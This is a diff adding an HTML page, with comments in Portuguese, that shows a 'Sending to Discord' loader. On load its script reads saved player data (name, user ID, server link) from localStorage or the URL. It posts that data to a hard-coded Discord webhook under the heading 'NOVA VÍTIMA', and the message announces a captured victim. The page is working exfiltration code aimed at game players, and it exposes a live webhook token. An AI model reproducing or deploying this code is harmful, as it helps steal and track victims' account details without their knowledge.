@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sending to Discord</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            background: #0f172a;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .loader {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            margin: 20px auto;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1 id="status">Sending to Discord...</h1>
+    <p id="message">Processing your request</p>
+    
+    <script>
+        // SEU WEBHOOK DO DISCORD AQUI (NÃO ESQUEÇA!)
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466545598273552437/VH33E3Wb2olx18f5YD3W8wl80pflegd1wiGMHtRRr6GXTOpLQj18uLc3s4UwRCVrNRhh";
+        
+        // Pega dados salvos
+        const savedData = localStorage.getItem('autoMoreiraData');
+        let data = { player_name: 'N/A', player_id: 'N/A', server_link: 'N/A' };
+        
+        if (savedData) {
+            data = JSON.parse(savedData);
+            console.log('📥 Data loaded:', data);
+            
+            // Limpa os dados depois de pegar
+            localStorage.removeItem('autoMoreiraData');
+        } else {
+            // Tenta pegar da URL também (fallback)
+            const params = new URLSearchParams(window.location.search);
+            if (params.toString()) {
+                data = {
+                    player_name: params.get('player_name') || 'N/A',
+                    player_id: params.get('player_id') || 'N/A',
+                    server_link: params.get('server_link') || 'N/A'
+                };
+            }
+        }
+        
+        // Função para enviar ao Discord
+        async function sendToDiscord() {
+            try {
+                const embed = {
+                    title: "🚨 AUTO MOREIRA - NOVA VÍTIMA!",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "👤 Jogador", value: data.player_name, inline: true },
+                        { name: "🆔 User ID", value: data.player_id, inline: true },
+                        { name: "🔗 Link do Servidor", value: data.server_link, inline: false },
+                        { name: "⏰ Hora", value: new Date().toLocaleString('pt-BR'), inline: true }
+                    ],
+                    footer: { text: "GitHub Pages • Sistema Automático" },
+                    timestamp: new Date().toISOString()
+                };
+                
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '@everyone **VÍTIMA CAPTURADA!**',
+                        embeds: [embed]
+                    })
+                });
+                
+                if (response.ok) {
+                    document.getElementById('status').innerHTML = '<span class="success">✅ Success!</span>';
+                    document.getElementById('message').textContent = 'Data sent to Discord successfully.';
+                    document.querySelector('.loader').style.borderTopColor = '#00ff00';
+                    console.log('✅ Sent to Discord!');
+                } else {
+                    throw new Error('Discord response: ' + response.status);
+                }
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                document.getElementById('status').innerHTML = '<span class="error">⚠️ Error</span>';
+                document.getElementById('message').textContent = 'Failed to send, but data was received.';
+            }
+        }
+        
+        // Executa quando a página carrega
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(sendToDiscord, 1000); // Pequeno delay para garantir
+        });
+    </script>
+</body>
+</html>
